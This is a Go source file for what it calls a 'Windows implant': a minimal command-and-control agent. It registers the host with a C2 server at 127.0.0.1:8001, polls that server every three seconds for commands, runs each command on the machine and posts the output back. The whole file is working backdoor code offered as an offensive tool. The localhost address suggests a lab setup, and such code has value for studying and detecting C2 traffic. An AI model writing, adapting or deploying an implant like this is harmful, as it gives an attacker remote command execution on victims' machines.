package main

import (
"bytes"
"encoding/json"
"fmt"
"io"
"net/http"
"os"
"os/exec"
"strings"
"time"
)

func main() {
hostname, _ := os.Hostname()
agentID := fmt.Sprintf("agent-%d", time.Now().Unix())

fmt.Printf("[+] Windows implant started on %s\n", hostname)
fmt.Printf("[+] Agent ID: %s\n", agentID)

registerData := map[string]string{
"id":       agentID,
"hostname": hostname,
"os":       "windows",
}
registerJSON, _ := json.Marshal(registerData)

resp, err := http.Post(
"http://127.0.0.1:8001/register",
"application/json",
bytes.NewBuffer(registerJSON),
)
if err != nil {
fmt.Printf("[-] Register failed: %v\n", err)
return
}
defer resp.Body.Close()

var regResult map[string]string
json.NewDecoder(resp.Body).Decode(&regResult)
if regResult["status"] != "registered" {
fmt.Printf("[-] Register failed: %s\n", regResult["status"])
return
}
fmt.Println("[+] Registered to C2 server")

fmt.Println("[+] Entering task loop...")

for {
taskReq := map[string]string{"agent_id": agentID}
taskJSON, _ := json.Marshal(taskReq)

resp, err := http.Post(
"http://127.0.0.1:8001/task",
"application/json",
bytes.NewBuffer(taskJSON),
)
if err != nil {
fmt.Printf("[-] Task request failed: %v\n", err)
time.Sleep(3 * time.Second)
continue
}

var taskResp map[string]interface{}
body, _ := io.ReadAll(resp.Body)
resp.Body.Close()

if err := json.Unmarshal(body, &taskResp); err != nil {
fmt.Printf("[-] Failed to parse task response: %v\n", err)
time.Sleep(3 * time.Second)
continue
}

cmd, ok := taskResp["command"]
if ok && cmd != nil && cmd != "" {
cmdStr := cmd.(string)
fmt.Printf("[+] Received task: %s\n", cmdStr)

parts := strings.Fields(cmdStr)
var out []byte
var execErr error

if len(parts) == 1 {
out, execErr = exec.Command(parts[0]).Output()
} else {
out, execErr = exec.Command(parts[0], parts[1:]...).Output()
}

output := string(out)
if execErr != nil {
output = execErr.Error()
}

fmt.Printf("[+] Output:\n%s\n", output)

resultData := map[string]string{
"agent_id": agentID,
"command":  cmdStr,
"output":   output,
}
resultJSON, _ := json.Marshal(resultData)

http.Post(
"http://127.0.0.1:8001/result",
"application/json",
bytes.NewBuffer(resultJSON),
)

} else {
fmt.Println("[+] No tasks available")
}

time.Sleep(3 * time.Second)
}
}
